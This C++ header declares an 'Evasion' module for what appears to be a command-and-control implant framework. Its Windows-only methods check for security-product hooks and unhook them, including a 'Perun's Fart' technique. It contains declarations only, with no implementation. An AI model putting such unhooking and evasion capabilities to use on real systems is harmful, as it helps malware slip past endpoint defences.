#pragma once

#include "ModuleCmd.hpp"


class Evasion : public ModuleCmd
{

public:
	Evasion();
	~Evasion();

	std::string getInfo();

	int init(std::vector<std::string>& splitedCmd, C2Message& c2Message);
	int process(C2Message& c2Message, C2Message& c2RetMessage);

private:

#ifdef _WIN32
	int checkHooks(std::string& result);
	int unhookFreshCopy(std::string& result);
	int unhookPerunsFart(std::string& result);
#endif

};


#ifdef _WIN32

extern "C" __declspec(dllexport) Evasion * A_EvasionConstructor();

#else

extern "C"  __attribute__((visibility("default"))) Evasion * EvasionConstructor();

#endif
